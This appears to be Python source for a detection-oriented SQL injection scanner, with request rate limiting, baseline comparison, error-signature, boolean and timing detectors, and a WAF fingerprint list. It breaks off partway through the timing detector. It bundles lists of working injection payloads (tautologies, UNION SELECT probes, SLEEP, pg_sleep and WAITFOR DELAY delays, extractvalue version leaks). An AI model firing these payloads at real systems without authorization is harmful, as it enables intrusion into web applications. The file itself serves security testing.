#!/usr/bin/env python3
"""
sql_map.py — Production-Grade SQL Injection Scanner (v2.1.0)
Oxysintx Framework

Architecture
    sql_map.py
    ├── Configuration          (ScanConfig, RunOptions, defaults)
    ├── Models                 (Payload, ScanFinding, BaselineSignature, TimingSample)
    ├── Payload Registry       (bundled fallback + wordlist loader)
    ├── HTTP Transport         (HTTPClient w/ session reuse, retry, token-bucket)
    ├── Baseline Engine        (multi-sample + normalization + stability check)
    ├── Parameter Discovery    (query params + HTML forms + POST data)
    ├── Detection Engines      (Error / Boolean / Time / Union)
    ├── Confidence & Validator (weighted scoring + status classification)
    ├── Deduplication          (normalized finding fingerprints)
    ├── Scan Pipeline          (adaptive flow + cancel + duration budget)
    ├── Streaming API          (run_streaming — SSE-friendly events)
    ├── Integration Adapters   (run, run_sql_injection_scan)
    └── CLI                    (argparse + --stream + --wordlists)

Detection techniques
    • error-based    — categorized DB signatures with weighted matching
    • boolean-based  — multi-signal comparison + normalized similarity
    • time-based     — statistical timing analysis (repeated measurements)
    • union-based    — safe structural detection, no data dumping

Safe by design — never extracts data, only confirms the vulnerability.

Author: Yanxzyx
"""

from __future__ import annotations

import argparse
import concurrent.futures
import hashlib
import json
import logging
import os
import re
import sys
import threading
import time
import uuid
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Callable, Dict, Iterator, List, Optional, Tuple, Union
from urllib.parse import urlparse, parse_qs, urlencode

import requests
from bs4 import BeautifulSoup
from requests.exceptions import RequestException

try:
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:  # pragma: no cover
    HTTPAdapter = None
    Retry = None


# ═══════════════════════════════════════════════════════════════════════════
# Metadata
# ═══════════════════════════════════════════════════════════════════════════
__version__ = "2.1.0"
__author__ = "Yanxzyx"
__framework__ = "Oxysintx"

logger = logging.getLogger("oxysintx.sqli")

TOOL_INFO = {
    "name": "SQLMap (SQL Injection)",
    "version": __version__,
    "description": (
        "Multi-technique SQL injection scanner. Basic: error-based + boolean-blind "
        "on the URL's query parameters. Expert: adds time-blind (statistical timing) "
        "and union-based structural detection. Safe by design — never dumps data."
    ),
    "category": "Web Vulnerability",
    "author": "Yanxzyx",
}


# ═══════════════════════════════════════════════════════════════════════════
# Paths & tunables
# ═══════════════════════════════════════════════════════════════════════════
_PROJECT_ROOT = Path(__file__).resolve().parent.parent
WORDLIST_DIR  = _PROJECT_ROOT / "wordlist"

DEFAULT_TIMEOUT                       = 5.0
DEFAULT_MAX_THREADS                   = 10
DEFAULT_MAX_REQUESTS                  = 200
DEFAULT_REQUEST_DELAY                 = 0.0
DEFAULT_RATE_LIMIT                    = 25.0      # requests/sec (token bucket)
DEFAULT_MAX_DURATION                  = 90.0      # seconds hard cap
DEFAULT_MAX_RESPONSE_SIZE             = 5 * 1024 * 1024
DEFAULT_RETRIES                       = 2
DEFAULT_RETRY_DELAY                   = 1.0
DEFAULT_BOOLEAN_SIMILARITY_THRESHOLD  = 0.85
DEFAULT_TIME_TRIGGER                  = 2.0
DEFAULT_BASELINE_SAMPLES              = 2
DEFAULT_CONFIDENCE_THRESHOLD          = 0.45
MIN_WORDLIST_ACCEPTABLE_LINES         = 4

# Filenames consumed by git_scraper_wordlist.py
WORDLISTS = {
    "error":   "sqli_error_based.txt",
    "boolean": None,                                 # bundled pairs
    "time":    "sqli_time_based.txt",
    "union":   "sqli_union_select.txt",
    "auth":    "sqli_auth_bypass.txt",
    "generic": "sqli_seclists_generic.txt",
}

# Sensitive headers to redact
SENSITIVE_HEADERS = {
    "authorization", "cookie", "set-cookie", "proxy-authorization",
    "x-api-key", "x-auth-token", "x-csrf-token", "x-session-id",
}

# Volatile-token patterns for response normalization
DYNAMIC_TOKEN_PATTERNS = [
    re.compile(r'name=["\']csrf[^"\']*["\'][^>]*value=["\'][^"\']*["\']', re.I),
    re.compile(r'name=["\']_token["\'][^>]*value=["\'][^"\']*["\']', re.I),
    re.compile(r'name=["\']__RequestVerificationToken["\'][^>]*value=["\'][^"\']*["\']', re.I),
    re.compile(r'\b(nonce|token|csrf|request_id|timestamp|time|random|uid|uuid)["\']?\s*[:=]\s*["\'][0-9a-fA-F\-]{4,}["\']', re.I),
    re.compile(r'\b\d{10,13}\b'),
]

# WAF signatures (informational only)
_WAF_SIGNATURES: Dict[str, List[str]] = {
    "Cloudflare":  ["cloudflare", "cf-ray", "__cfduid", "cf-cache-status"],
    "AWS WAF":     ["awselb", "x-amz-cf-id", "x-amzn-requestid"],
    "ModSecurity": ["mod_security", "modsecurity"],
    "Sucuri":      ["sucuri", "x-sucuri-id"],
    "Incapsula":   ["incap_ses", "visid_incap", "incapsula"],
    "F5 BIG-IP":   ["bigipserver", "tscookie", "f5-"],
    "Wordfence":   ["wordfence"],
    "Barracuda":   ["barra_counter_session", "barracuda"],
}


# ═══════════════════════════════════════════════════════════════════════════
# Utility helpers
# ═══════════════════════════════════════════════════════════════════════════
def redact_sensitive_headers(headers: Dict[str, str]) -> Dict[str, str]:
    if not headers:
        return headers
    return {
        k: ("[REDACTED]" if k.lower() in SENSITIVE_HEADERS else v)
        for k, v in headers.items()
    }


def sanitize_payload_for_log(payload: str, max_len: int = 60) -> str:
    if not payload:
        return ""
    return payload if len(payload) <= max_len else payload[:max_len] + "..."


def _normalize_url(target: str) -> str:
    t = (target or "").strip()
    if not t:
        raise ValueError("target is required")
    if not t.lower().startswith(("http://", "https://")):
        t = "http://" + t
    return t


def _detect_waf(headers: Dict[str, str], body: str) -> Optional[str]:
    hay = (" ".join(f"{k}: {v}" for k, v in headers.items())
           + " " + (body or "")[:4000]).lower()
    for name, sigs in _WAF_SIGNATURES.items():
        if any(sig.lower() in hay for sig in sigs):
            return name
    return None


# ═══════════════════════════════════════════════════════════════════════════
# Wordlist loading (compatible with git_scraper_wordlist.py)
# ═══════════════════════════════════════════════════════════════════════════
_wordlist_cache: Dict[str, List[str]] = {}
_wordlist_lock = threading.RLock()


def _filter_line(line: str) -> Optional[str]:
    s = line.strip()
    if not s or s.startswith(("#", "//", ";")):
        return None
    if len(s) > 512:
        return None
    return s


def load_wordlist(name: Optional[str],
                  bundled: List[str],
                  max_lines: int = 60) -> List[str]:
    """Load a wordlist from disk; fall back to the bundled payload set."""
    if not name:
        return bundled[:max_lines]

    with _wordlist_lock:
        if name in _wordlist_cache:
            return _wordlist_cache[name][:max_lines]

        base = Path(name).name
        target = (WORDLIST_DIR / base).resolve()
        try:
            target.relative_to(WORDLIST_DIR.resolve())
        except ValueError:
            return bundled[:max_lines]

        if target.exists() and target.stat().st_size > 0:
            try:
                lines: List[str] = []
                with target.open("r", encoding="utf-8", errors="replace") as f:
                    for raw in f:
                        s = _filter_line(raw)
                        if s:
                            lines.append(s)
                        if len(lines) >= max_lines:
                            break
                if len(lines) >= MIN_WORDLIST_ACCEPTABLE_LINES:
                    _wordlist_cache[name] = lines
                    return lines
            except OSError:
                pass

        return bundled[:max_lines]


def ensure_wordlists() -> Dict[str, Any]:
    """Return metadata about the wordlists this module relies on."""
    out: Dict[str, Any] = {"wordlists": [], "version": __version__}
    for key, fname in WORDLISTS.items():
        entries = load_wordlist(fname, _bundled_for(key), max_lines=200)
        p = (WORDLIST_DIR / fname) if fname else None
        out["wordlists"].append({
            "key":    key,
            "name":   fname or "(bundled)",
            "count":  len(entries),
            "path":   str(p) if p else None,
            "exists": bool(p and p.exists() and p.stat().st_size > 0),
        })
    return out


def _bundled_for(key: str) -> List[str]:
    return {
        "error":   PayloadRegistry.__dict__["_bundled_error_values"],
        "time":    PayloadRegistry.__dict__["_bundled_time_values"],
        "union":   PayloadRegistry.__dict__["_bundled_union_values"],
    }.get(key, [])


# ═══════════════════════════════════════════════════════════════════════════
# Token-bucket rate limiter
# ═══════════════════════════════════════════════════════════════════════════
class _TokenBucket:
    def __init__(self, rate: float, burst: int = 4):
        self.rate    = max(0.1, float(rate))
        self.burst   = max(1, int(burst))
        self._tokens = float(self.burst)
        self._last   = time.monotonic()
        self._lock   = threading.Lock()

    def acquire(self, timeout: float = 20.0) -> bool:
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            with self._lock:
                now = time.monotonic()
                self._tokens = min(self.burst,
                                   self._tokens + (now - self._last) * self.rate)
                self._last = now
                if self._tokens >= 1.0:
                    self._tokens -= 1.0
                    return True
                wait = (1.0 - self._tokens) / self.rate
            time.sleep(min(wait, 0.2))
        return False


# ═══════════════════════════════════════════════════════════════════════════
# Configuration
# ═══════════════════════════════════════════════════════════════════════════
@dataclass
class ScanConfig:
    timeout: float = DEFAULT_TIMEOUT
    max_threads: int = DEFAULT_MAX_THREADS
    verify_ssl: bool = True
    follow_redirects: bool = False
    max_requests: int = DEFAULT_MAX_REQUESTS
    request_delay: float = DEFAULT_REQUEST_DELAY
    rate_limit: float = DEFAULT_RATE_LIMIT
    max_duration: float = DEFAULT_MAX_DURATION
    max_response_size: int = DEFAULT_MAX_RESPONSE_SIZE
    retries: int = DEFAULT_RETRIES
    retry_delay: float = DEFAULT_RETRY_DELAY
    baseline_samples: int = DEFAULT_BASELINE_SAMPLES
    boolean_similarity_threshold: float = DEFAULT_BOOLEAN_SIMILARITY_THRESHOLD
    time_trigger: float = DEFAULT_TIME_TRIGGER
    confidence_threshold: float = DEFAULT_CONFIDENCE_THRESHOLD
    continue_after_detection: bool = True
    test_error: bool = True
    test_boolean: bool = True
    test_time: bool = True
    test_union: bool = True
    stop_event: Optional[threading.Event] = None
    progress_cb: Optional[Callable[[int, int, str], None]] = None

    def validate(self) -> None:
        if self.timeout <= 0: raise ValueError("timeout must be > 0")
        if self.max_threads < 1: raise ValueError("max_threads must be >= 1")
        if self.max_requests < 1: raise ValueError("max_requests must be >= 1")
        if self.request_delay < 0: raise ValueError("request_delay must be >= 0")
        if self.rate_limit < 0: raise ValueError("rate_limit must be >= 0")
        if self.max_duration <= 0: raise ValueError("max_duration must be > 0")
        if self.max_response_size < 1024: raise ValueError("max_response_size must be >= 1024")
        if self.retries < 0: raise ValueError("retries must be >= 0")
        if self.baseline_samples < 1: raise ValueError("baseline_samples must be >= 1")
        if not (0 <= self.boolean_similarity_threshold <= 1):
            raise ValueError("boolean_similarity_threshold must be between 0 and 1")
        if not (0 <= self.confidence_threshold <= 1):
            raise ValueError("confidence_threshold must be between 0 and 1")


# ═══════════════════════════════════════════════════════════════════════════
# Models
# ═══════════════════════════════════════════════════════════════════════════
@dataclass(frozen=True)
class Payload:
    value: str
    technique: str
    database: Optional[str] = None
    risk: str = "low"
    expected_behavior: str = ""


@dataclass
class BaselineSignature:
    status_code: int = 0
    response_length: int = 0
    content_type: str = ""
    title: str = ""
    normalized_body_hash: str = ""
    normalized_body_preview: str = ""
    timestamp: float = 0.0


@dataclass
class TimingSample:
    values: List[float] = field(default_factory=list)

    def mean(self) -> float:
        return sum(self.values) / len(self.values) if self.values else 0.0

    def std_dev(self) -> float:
        if len(self.values) < 2:
            return 0.0
        m = self.mean()
        variance = sum((v - m) ** 2 for v in self.values) / (len(self.values) - 1)
        return variance ** 0.5


@dataclass
class ScanFinding:
    parameter: str
    technique: str
    confidence: float
    severity: str
    status: str
    database_type: Optional[str] = None
    evidence: Dict[str, Any] = field(default_factory=dict)
    matched_error: Optional[str] = None
    payload: str = ""
    response_status: Optional[int] = None
    baseline_length: Optional[int] = None
    response_length: Optional[int] = None
    similarity: Optional[float] = None

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class ScanResult:
    url: str = ""
    method: str = "GET"
    parameters_tested: List[str] = field(default_factory=list)
    payloads_tested: int = 0
    findings: List[ScanFinding] = field(default_factory=list)
    vulnerable: bool = False
    status: str = "unknown"
    scan_id: str = ""
    started_at: str = ""
    completed_at: str = ""
    duration: float = 0.0
    requests_sent: int = 0
    errors: int = 0
    warnings: List[str] = field(default_factory=list)
    techniques_tested: List[str] = field(default_factory=list)
    database_hint: Optional[str] = None
    waf_detected: Optional[str] = None
    cancelled: bool = False

    def to_dict(self) -> Dict[str, Any]:
        return {
            "url": self.url,
            "method": self.method,
            "parameters_tested": self.parameters_tested,
            "payloads_tested": self.payloads_tested,
            "findings": [f.to_dict() for f in self.findings],
            "vulnerable": self.vulnerable,
            "status": self.status,
            "scan_id": self.scan_id,
            "started_at": self.started_at,
            "completed_at": self.completed_at,
            "duration": self.duration,
            "requests_sent": self.requests_sent,
            "errors": self.errors,
            "warnings": self.warnings,
            "techniques_tested": self.techniques_tested,
            "database_hint": self.database_hint,
            "waf_detected": self.waf_detected,
            "cancelled": self.cancelled,
            "scan_type": "sqli",
            "version": __version__,
        }


# ═══════════════════════════════════════════════════════════════════════════
# Payload Registry
# ═══════════════════════════════════════════════════════════════════════════
class PayloadRegistry:
    """Bundled payloads — used when the on-disk wordlists are absent."""

    ERROR_MYSQL = [
        Payload("'", "error", "mysql", "low", "quote break"),
        Payload("''", "error", "mysql", "low", "double quote"),
        Payload("' OR '1'='1", "error", "mysql", "medium", "always true"),
        Payload("1' ORDER BY 10--", "error", "mysql", "medium", "column overflow"),
        Payload("1' UNION SELECT NULL,NULL,NULL--", "error", "mysql", "high", "union test"),
    ]
    ERROR_POSTGRESQL = [
        Payload("'; SELECT * FROM pg_catalog.pg_tables--", "error", "postgresql", "high", "pg_catalog probe"),
        Payload("' OR 1=1--", "error", "postgresql", "medium", "always true"),
        Payload("1' ORDER BY 100--", "error", "postgresql", "medium", "column overflow"),
    ]
    ERROR_MSSQL = [
        Payload("'; WAITFOR DELAY '0:0:0'--", "error", "mssql", "medium", "mssql syntax check"),
        Payload("' OR 1=1--", "error", "mssql", "medium", "always true"),
        Payload("1' ORDER BY 100--", "error", "mssql", "medium", "column overflow"),
    ]
    ERROR_ORACLE = [
        Payload("' OR 1=1--", "error", "oracle", "medium", "always true"),
        Payload("1' ORDER BY 100--", "error", "oracle", "medium", "column overflow"),
    ]
    ERROR_SQLITE = [
        Payload("' OR 1=1--", "error", "sqlite", "medium", "always true"),
        Payload("1' ORDER BY 100--", "error", "sqlite", "medium", "column overflow"),
    ]
    ERROR_GENERIC = [
        Payload("'", "error", None, "low", "single quote"),
        Payload('"', "error", None, "low", "double quote"),
        Payload("' OR '1'='1", "error", None, "medium", "always true"),
        Payload("1' AND 1=1--", "error", None, "medium", "true condition"),
        Payload("1' AND 1=2--", "error", None, "medium", "false condition"),
        Payload("1' ORDER BY 1--", "error", None, "medium", "order by test"),
        Payload("1' ORDER BY 100--", "error", None, "medium", "order overflow"),
    ]
    BOOLEAN_TRUE = [
        Payload("' AND '1'='1", "boolean", None, "medium", "boolean true"),
        Payload("' AND 1=1--", "boolean", None, "medium", "boolean true"),
        Payload("1 AND 1=1", "boolean", None, "medium", "boolean true"),
        Payload("1' AND 1=1--", "boolean", None, "medium", "boolean true"),
    ]
    BOOLEAN_FALSE = [
        Payload("' AND '1'='2", "boolean", None, "medium", "boolean false"),
        Payload("' AND 1=2--", "boolean", None, "medium", "boolean false"),
        Payload("1 AND 1=2", "boolean", None, "medium", "boolean false"),
        Payload("1' AND 1=2--", "boolean", None, "medium", "boolean false"),
    ]
    TIME_MYSQL = [
        Payload("' OR SLEEP(1)--", "time", "mysql", "medium", "sleep"),
        Payload("1' AND SLEEP(2)--", "time", "mysql", "medium", "sleep"),
    ]
    TIME_POSTGRESQL = [
        Payload("' OR pg_sleep(1)--", "time", "postgresql", "medium", "pg_sleep"),
    ]
    TIME_MSSQL = [
        Payload("'; WAITFOR DELAY '0:0:2'--", "time", "mssql", "medium", "waitfor delay"),
    ]
    TIME_ORACLE = [
        Payload("' OR 1=1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',1)--", "time", "oracle", "medium", "dbms_pipe"),
    ]
    TIME_SQLITE = [
        Payload("' OR 1=1 AND 1=randomblob(1000000)--", "time", "sqlite", "medium", "randomblob"),
    ]
    TIME_GENERIC = [
        Payload("' OR SLEEP(1)--", "time", None, "medium", "sleep"),
        Payload("1' AND SLEEP(1)--", "time", None, "medium", "sleep"),
    ]
    UNION_GENERIC = [
        Payload("' UNION SELECT NULL--", "union", None, "medium", "single column union"),
        Payload("' UNION SELECT NULL,NULL--", "union", None, "medium", "two column union"),
        Payload("' UNION SELECT NULL,NULL,NULL--", "union", None, "medium", "three column union"),
        Payload("1' UNION SELECT 1,2,3--", "union", None, "medium", "numeric union"),
    ]

    # ── Bundled value lists for the wordlist loader ────────────────────
    _bundled_error_values = [
        "'", "\"", "'--", "\"--", "'#", "')", "')--", "';",
        "' OR '1'='1", "' AND '1'='2", "') OR ('1'='1",
        "1' AND extractvalue(1,concat(0x7e,version()))--",
        "1' AND updatexml(1,concat(0x7e,version()),1)--",
        "1 AND 1=convert(int,@@version)--",
        "' AND 1=(SELECT COUNT(*) FROM information_schema.tables)--",
    ]
    _bundled_time_values = [
        "' AND SLEEP(3)--", "' AND SLEEP(3)#", "\" AND SLEEP(3)--",
        "1' AND SLEEP(3)--", "1 AND SLEEP(3)--", "'; SELECT pg_sleep(3)--",
        "' AND 1=(SELECT 1 FROM PG_SLEEP(3))--", "'; WAITFOR DELAY '0:0:3'--",
        "' WAITFOR DELAY '0:0:3'--", "1; WAITFOR DELAY '0:0:3'--",
        "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)--",
        "' AND randomblob(100000000)--",
    ]
    _bundled_union_values = [
        "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--", "' UNION ALL SELECT NULL--",
        "' UNION SELECT 1,2,3--",
    ]

    @classmethod
    def get_error_payloads(cls, db: Optional[str] = None) -> List[Payload]:
        # Prefer on-disk wordlist if present
        disk = load_wordlist(WORDLISTS["error"], cls._bundled_error_values, max_lines=60)
        if disk and disk is not cls._bundled_error_values:
            return [Payload(p, "error", None, "low", "") for p in disk]
        if db is None:
            return cls.ERROR_GENERIC.copy()
        return (getattr(cls, f"ERROR_{db.upper()}", None) or cls.ERROR_GENERIC).copy()

    @classmethod
    def get_boolean_payloads(cls) -> Tuple[List[Payload], List[Payload]]:
        return cls.BOOLEAN_TRUE.copy(), cls.BOOLEAN_FALSE.copy()

    @classmethod
    def get_time_payloads(cls, db: Optional[str] = None) -> List[Payload]:
        disk = load_wordlist(WORDLISTS["time"], cls._bundled_time_values, max_lines=40)
        if disk and disk is not cls._bundled_time_values:
            return [Payload(p, "time", None, "low", "") for p in disk]
        if db is None:
            return cls.TIME_GENERIC.copy()
        return (getattr(cls, f"TIME_{db.upper()}", None) or cls.TIME_GENERIC).copy()

    @classmethod
    def get_union_payloads(cls) -> List[Payload]:
        disk = load_wordlist(WORDLISTS["union"], cls._bundled_union_values, max_lines=40)
        if disk and disk is not cls._bundled_union_values:
            return [Payload(p, "union", None, "low", "") for p in disk]
        return cls.UNION_GENERIC.copy()


# ═══════════════════════════════════════════════════════════════════════════
# Response Normalizer
# ═══════════════════════════════════════════════════════════════════════════
class ResponseNormalizer:
    @staticmethod
    def normalize(html: str) -> str:
        if not html:
            return ""
        text = html
        text = re.sub(r"<script[^>]*>.*?</script>", "", text, flags=re.I | re.S)
        text = re.sub(r"<style[^>]*>.*?</style>",   "", text, flags=re.I | re.S)
        for pattern in DYNAMIC_TOKEN_PATTERNS:
            text = pattern.sub("", text)
        text = re.sub(r"\s+", " ", text).strip()
        return text

    @staticmethod
    def hash_normalized(text: str) -> str:
        return hashlib.sha256(text.encode("utf-8", errors="ignore")).hexdigest()

    @staticmethod
    def similarity(a: str, b: str) -> float:
        if a == b: return 1.0
        if not a or not b: return 0.0
        def bigrams(s: str) -> set:
            s = s.lower()
            return {s[i:i+2] for i in range(max(len(s) - 1, 0))} if len(s) > 1 else {s}
        g1, g2 = bigrams(a), bigrams(b)
        if not g1 or not g2: return 0.0
        inter = len(g1 & g2); union = len(g1 | g2)
        return inter / union if union else 1.0


# ═══════════════════════════════════════════════════════════════════════════
# HTTP Transport
# ═══════════════════════════════════════════════════════════════════════════
class HTTPClient:
    """Thread-safe HTTP transport with session reuse, retry, token bucket."""

    def __init__(self,
                 config: ScanConfig,
                 headers: Optional[Dict[str, str]] = None,
                 cookies: Optional[Dict[str, str]] = None,
                 proxies: Optional[Dict[str, str]] = None):
        self.config = config
        self.headers = headers or {"User-Agent": f"Oxysintx-SQLi-Scanner/{__version__}"}
        self.cookies = cookies
        self.proxies = proxies
        self._session: Optional[requests.Session] = None
        self._last_request_time = 0.0
        self._request_count = 0
        self._lock = threading.Lock()
        self._bucket = (
            _TokenBucket(config.rate_limit, burst=4)
            if config.rate_limit and config.rate_limit > 0 else None
        )
        self._started_mono = time.monotonic()

    def _get_session(self) -> requests.Session:
        with self._lock:
            if self._session is None:
                s = requests.Session()
                s.headers.update(self.headers)
                if self.cookies:  s.cookies.update(self.cookies)
                if self.proxies:  s.proxies.update(self.proxies)
                s.verify = self.config.verify_ssl
                if HTTPAdapter and Retry:
                    adapter = HTTPAdapter(
                        pool_connections=16, pool_maxsize=32,
                        max_retries=Retry(
                            total=0,   # we do our own retries
                            status_forcelist=(502, 503, 504),
                            allowed_methods=frozenset(["GET", "POST"]),
                            raise_on_status=False,
                        ),
                    )
                    s.mount("http://", adapter)
                    s.mount("https://", adapter)
                self._session = s
            return self._session

    # ── budget / cancel / rate ────────────────────────────────────────
    def _check_budget(self) -> bool:
        return self._request_count >= self.config.max_requests

    def _check_stop(self) -> bool:
        if self.config.stop_event is not None and self.config.stop_event.is_set():
            return True
        if (time.monotonic() - self._started_mono) > self.config.max_duration:
            return True
        return False

    def _apply_rate_limit(self) -> None:
        if self._bucket is not None:
            self._bucket.acquire(timeout=20.0)
            return
        if self.config.request_delay > 0:
            now = time.time()
            elapsed = now - self._last_request_time
            if elapsed < self.config.request_delay:
                time.sleep(self.config.request_delay - elapsed)
            self._last_request_time = time.time()

    # ── main request ──────────────────────────────────────────────────
    def request(self, method: str, url: str,
                params: Optional[Dict] = None,
                data: Optional[Dict] = None,
                measure_time: bool = False
                ) -> Optional[Union[requests.Response,
                                    Tuple[requests.Response, float]]]:
        with self._lock:
            if self._check_budget() or self._check_stop():
                return None
            self._apply_rate_limit()
            self._request_count += 1

        session = self._get_session()
        method = method.upper()

        for attempt in range(self.config.retries + 1):
            if self._check_stop():
                return None
            try:
                start = time.time()
                if method == "GET":
                    response = session.get(url, params=params,
                                           timeout=self.config.timeout,
                                           allow_redirects=self.config.follow_redirects)
                elif method == "POST":
                    response = session.post(url, data=data,
                                            timeout=self.config.timeout,
                                            allow_redirects=self.config.follow_redirects)
                else:
                    raise ValueError(f"Unsupported HTTP method: {method}")
                elapsed = time.time() - start

                if measure_time:
                    return response, elapsed
                return response
            except RequestException as e:
                logger.debug("Request failed (attempt %d/%d): %s",
                             attempt + 1, self.config.retries + 1, e)
                if attempt < self.config.retries:
                    time.sleep(self.config.retry_delay * (attempt + 1))
                else:
                    return None
        return None


# ═══════════════════════════════════════════════════════════════════════════
# Baseline Engine
# ═══════════════════════════════════════════════════════════════════════════
class BaselineEngine:
    def __init__(self, http_client: HTTPClient,
                 normalizer: ResponseNormalizer, config: ScanConfig):
        self.http_client = http_client
        self.normalizer  = normalizer
        self.config      = config

    def collect_baseline(self, url: str, method: str,
                         params: Optional[Dict] = None,
                         data:   Optional[Dict] = None) -> BaselineSignature:
        response = self.http_client.request(method, url, params=params, data=data)
        if response is None:
            return BaselineSignature()

        text = response.text[:self.config.max_response_size]
        normalized = self.normalizer.normalize(text)
        title_match = re.search(r"<title[^>]*>(.*?)</title>", text, re.I | re.S)
        title = title_match.group(1).strip() if title_match else ""

        return BaselineSignature(
            status_code=response.status_code,
            response_length=len(response.text),
            content_type=response.headers.get("Content-Type", ""),
            title=title,
            normalized_body_hash=self.normalizer.hash_normalized(normalized),
            normalized_body_preview=normalized[:200],
            timestamp=time.time(),
        )

    def collect_multiple_baselines(self, url: str, method: str,
                                   params: Optional[Dict] = None,
                                   data:   Optional[Dict] = None
                                   ) -> List[BaselineSignature]:
        out: List[BaselineSignature] = []
        for _ in range(self.config.baseline_samples):
            if self.config.stop_event is not None and self.config.stop_event.is_set():
                break
            sig = self.collect_baseline(url, method, params, data)
            if sig.status_code > 0:
                out.append(sig)
            else:
                break
        return out

    @staticmethod
    def is_stable(baselines: List[BaselineSignature]) -> bool:
        if not baselines: return False
        if len(baselines) == 1: return True
        hashes = [b.normalized_body_hash for b in baselines if b.normalized_body_hash]
        return bool(hashes) and len(set(hashes)) == 1


# ═══════════════════════════════════════════════════════════════════════════
# Detection Engines
# ═══════════════════════════════════════════════════════════════════════════
class ErrorDetector:
    ERROR_PATTERNS = [
        (re.compile(r"you have an error in your sql syntax", re.I), "mysql", 0.95),
        (re.compile(r"mysql_fetch_(array|row|assoc|object)", re.I), "mysql", 0.90),
        (re.compile(r"warning:\s+mysql_", re.I), "mysql", 0.85),
        (re.compile(r"mysqli::query\(\)", re.I), "mysql", 0.90),
        (re.compile(r"mysql_num_rows", re.I), "mysql", 0.85),
        (re.compile(r"pg_query\(\)", re.I), "postgresql", 0.90),
        (re.compile(r"postgresql.*error", re.I), "postgresql", 0.85),
        (re.compile(r"psql:.*syntax error", re.I), "postgresql", 0.90),
        (re.compile(r"syntax error at or near", re.I), "postgresql", 0.85),
        (re.compile(r"microsoft ole db provider for odbc drivers", re.I), "mssql", 0.90),
        (re.compile(r"odbc microsoft access driver", re.I), "mssql", 0.85),
        (re.compile(r"sql server.*error", re.I), "mssql", 0.85),
        (re.compile(r"unclosed quotation mark after the character string", re.I), "mssql", 0.90),
        (re.compile(r"ora-\d{4,5}", re.I), "oracle", 0.90),
        (re.compile(r"oracle.*error", re.I), "oracle", 0.80),
        (re.compile(r"quoted string not properly terminated", re.I), "oracle", 0.85),
        (re.compile(r"sqlite3\.operationalerror", re.I), "sqlite", 0.90),
        (re.compile(r"sqlite3\.warning", re.I), "sqlite", 0.85),
        (re.compile(r'near ".*": syntax error', re.I), "sqlite", 0.85),
        (re.compile(r"sql command not properly ended", re.I), None, 0.80),
        (re.compile(r"pdoexception", re.I), None, 0.75),
        (re.compile(r"sqlstate\[", re.I), None, 0.80),
        (re.compile(r"unterminated quoted string", re.I), None, 0.80),
    ]

    @classmethod
    def detect(cls, response_text: str) -> Optional[Dict[str, Any]]:
        if not response_text:
            return None
        best: Optional[Dict[str, Any]] = None
        best_w = 0.0
        for rx, db, weight in cls.ERROR_PATTERNS:
            if rx.search(response_text) and weight > best_w:
                best_w = weight
                best = {
                    "database_type": db,
                    "matched_error": rx.pattern,
                    "confidence": weight,
                }
        return best


class BooleanDetector:
    def __init__(self, config: ScanConfig, normalizer: ResponseNormalizer):
        self.config = config
        self.normalizer = normalizer

    def compare(self, baseline: BaselineSignature,
                true_response: requests.Response,
                false_response: requests.Response) -> Optional[Dict[str, Any]]:
        if true_response is None or false_response is None:
            return None

        true_text  = self.normalizer.normalize(true_response.text[:self.config.max_response_size])
        false_text = self.normalizer.normalize(false_response.text[:self.config.max_response_size])
        base_text  = baseline.normalized_body_preview

        sim_true  = self.normalizer.similarity(true_text, base_text) if base_text else 0.0
        sim_false = self.normalizer.similarity(false_text, base_text) if base_text else 0.0
        sim_tf    = self.normalizer.similarity(true_text, false_text)

        signals: List[float] = []
        status_diff = abs(true_response.status_code - false_response.status_code)
        signals.append(0.8 if status_diff > 0 else 0.2)

        len_t = len(true_response.text); len_f = len(false_response.text)
        len_delta = abs(len_t - len_f) / max(len_t, len_f, 1)
        signals.append(0.7 if len_delta > 0.10 else 0.5 if len_delta > 0.05 else 0.1)

        signals.append(0.7 if sim_tf < 0.9 else 0.1)

        t_title = re.search(r"<title[^>]*>(.*?)</title>", true_response.text,  re.I | re.S)
        f_title = re.search(r"<title[^>]*>(.*?)</title>", false_response.text, re.I | re.S)
        if t_title and f_title:
            signals.append(0.6 if t_title.group(1).strip() != f_title.group(1).strip() else 0.1)
        else:
            signals.append(0.2)

        confidence = sum(signals) / len(signals)
        if confidence < self.config.confidence_threshold:
            return None

        return {
            "confidence": confidence,
            "similarity_true_baseline": sim_true,
            "similarity_false_baseline": sim_false,
            "similarity_true_false": sim_tf,
            "length_delta": len_delta,
            "status_diff": status_diff,
            "signal_count": len(signals),
            "signals": signals,
        }


class TimeDetector:
    def __init__(self, config: ScanConfig, http_client: HTTPClient):
        self.config = config
        self.http_client = http_client

    def detect(self, url: str, method: str, payload: str,
               param_name: str, static_params: Dict[str, str]
               ) -> Optional[Dict[str, Any]]:
        baseline_times: List[float] = []
        inject_times:   List[float] = []

        for _ in range(max(2, self.config.baseline_samples)):
            if self.config.stop_event is not None and self.config.stop_event.is_set():
                return None
            if method.upper() == "GET":
                p = dict(static_params or {}); p[param_name] = "1"
                r = self.http_client.request(method, url, params=p, measure_time=True)
            else:
                d = dict(static_params or {}); d[param_name] = "1"
                r = self.http_client.request(method, url, data=d, measure_time=True)
            if r is not None:
                baseline_times.append(r[1])

        for _ in range(2):
            if self.config.stop_event is not None and self.config.stop_event.is_set():
                return None
            if method.upper() == "GET":
                p = dict(static_params or {}); p[param_name] = payload
                r = self.http_client.request(method, url, params=p, measure_time=True)
            else:
                d = dict(static_params or {}); d[param_name] = payload
                r = self.http_client.request(method, url, data=d, measure_time=True)
            if r is not None:
                inject_times.append(r[1])

        if not baseline_times or not inject_times:
            return None

        bs = TimingSample(baseline_times); is_ = TimingSample(inject_times)
        delta = is_.mean() - bs.mean()
        jitter = bs.std_dev() + is_.std_dev()
        if delta < self.config.time_trigger:
            return None

        consistency = 1.0 - min(jitter / delta, 1.0) if jitter > 0 else 1.0
        delta_factor = min(delta / (self.config.time_trigger * 2), 1.0)
        confidence = 0.5 + 0.5 * delta_factor * consistency
        if confidence < self.config.confidence_threshold:
            return None

        return {
            "baseline_mean": bs.mean(),
